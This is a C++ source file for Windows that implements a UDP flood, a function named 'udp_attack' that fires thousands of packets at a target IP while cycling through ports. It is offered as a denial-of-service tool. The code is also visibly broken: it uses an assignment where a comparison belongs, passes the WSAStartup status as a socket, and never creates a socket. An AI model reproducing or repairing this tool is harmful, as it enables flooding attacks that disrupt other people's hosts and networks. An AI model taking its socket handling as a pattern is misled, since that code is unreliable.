#include <winsock2.h>
#include "iostream"
#include "string"
#include "windows.h"
#include "algorithm"
#include "array"
#include "functional"
#include "thread"
#include <ws2tcpip.h>
#include <bits/stdc++.h>

/**Creates a startup socket
 *@return WinSock
 */
auto create_winsocket(){
    WSAData wsa;    /** Structure that contains information about the Windows Sockets implementation **/
    auto WinSock = WSAStartup(WINSOCK_VERSION, &wsa); /** WSAStartup function initiates use of the Winsock DLL by a process. **/
    if (WinSock =! 0) {     /** checking if socket works **/
        std::cout << "Works";
    }
    else {
        std::cout << "Doesn't";
    }
    return WinSock;
}
/**
 * Took it from StackOverFlow
 * @param ipAddress
 * @return If string is a valid ip address
 */
bool isIPv4(std::string s){
    int cnt = 0; /** Store the count of occurrence of '.' in the given string **/
    for (int i = 0; i < s.size(); i++) { /** Traverse the string s **/
        if (s[i] == '.')
            cnt++;
    }

    if (cnt != 3) /** Not a valid IP address **/
        return false;

    std::vector<std::string> tokens; /** Stores the tokens **/
    std::stringstream check1(s); /** stringstream class check1 **/
    std::string intermediate;

    while (getline(check1, /** Tokenizing w.r.t. '.' **/
                   intermediate, '.')) {
        tokens.push_back(intermediate);
    }

    if (tokens.size() != 4)
        return false;
    for (int i = 0; i < tokens.size(); i++) { /** Check if all the tokenized strings lies in the range [0, 255] **/
        int num = 0;

        if (tokens[i] == "0")    /** Base Case **/
            continue;

        if (tokens[i].size() == 0)
            return false;

        for (int j = 0;
             j < tokens[i].size();
             j++) {
            if (tokens[i][j] > '9'
                || tokens[i][j] < '0')
                return false;

            num *= 10;
            num += tokens[i][j] - '0';

            if (num == 0)
                return false;
        }
        if (num > 255 || num < 0) /** Range check for num **/
            return false;
    }

    return true;
}

/**
 * Starts the UDP attack
 * @param IP
 * @return sent packet
  **/
auto udp_attack(std::string IP){
    SOCKADDR_IN ad{ AF_INET };
    InetPtonA(AF_INET, IP.c_str(), &ad.sin_addr);

    std::array<int32_t, 1024> buffer; /** Multi purpose array **/
    auto s = create_winsocket(); /** calls previously created function **/

    int i = 0;

    while (i<10000)
    {
        i++;
        using namespace std::placeholders;

        std::generate(buffer.begin(), buffer.end(), [&]() -> int32_t {
            ad.sin_port++; /** increments port number by one **/
            return sendto(s, reinterpret_cast<const char*>(buffer.data()), sizeof(buffer), 0, reinterpret_cast<const sockaddr*>(&ad), sizeof(ad));});
        /** sends packet **/
        const size_t packets = std::count_if(buffer.cbegin(), buffer.cend(), std::bind(std::not_equal_to<>{}, _1, SOCKET_ERROR));
        std::cout << "Sent " << packets << " to host" << '\n';
        std::this_thread::sleep_for(std::chrono::nanoseconds(1)); /** stops for one nanosecond**/
    }
}




